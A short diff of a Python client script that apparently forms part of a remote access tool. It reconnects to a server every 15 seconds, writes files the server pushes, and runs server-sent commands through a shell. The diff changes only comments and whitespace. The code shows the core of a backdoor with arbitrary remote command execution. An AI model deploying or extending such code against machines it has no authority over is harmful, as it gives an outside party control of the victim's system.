@@ -4,10 +4,10 @@ import sys
 import time
 
 # Set IP address and PORT to the server
-SERVER_HOST = '127.0.0.1'  # Temporary localhost for testing (Make sure to use the client's IP during production
+SERVER_HOST = '127.0.0.1'   # Temporary localhost for testing (Make sure to use the client's IP during production
 SERVER_PORT = 21420
 
-# Connect to server with given IP and PORT
+# Attemot to connect to server with given IP and PORT every 15 seconds
 client = socket.socket()
 while True:
     try:
@@ -47,6 +47,7 @@ while True:
                 f.write(data)
             client.send("Download complete.".encode())
             f.close()
+        # Remotely execute a program or executable
         elif serverCommand == "exe_True":
             exeCommand = client.recv(1024).decode()
             subprocess.Popen(exeCommand, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
